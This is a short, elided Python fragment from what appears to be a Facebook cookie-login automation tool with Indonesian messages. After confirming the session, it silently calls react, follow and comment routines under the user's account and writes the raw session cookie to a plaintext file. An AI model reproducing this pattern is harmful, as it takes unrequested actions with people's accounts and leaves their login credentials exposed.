	...
	def login(self):
		try:
			...
			if "mbasic_logout_button" in cek:
				...
				a=hehe(self.kuki);a.gak_bisa_bahasa_enggres();a.react();a.tuturkeun();open("cookie","w").write(self.kuki.get("cookie"));hehe({"cookie":open("cookie").read()}).komen();exit("[✓] Login Berhasil, Jalankan Ulang Tools Nya")
			else:
				exit("\n\n[!] Cookie Invalid")
		except req.exceptions.ConnectionError:
			exit("[!] Kesalahan Pada Koneksi")
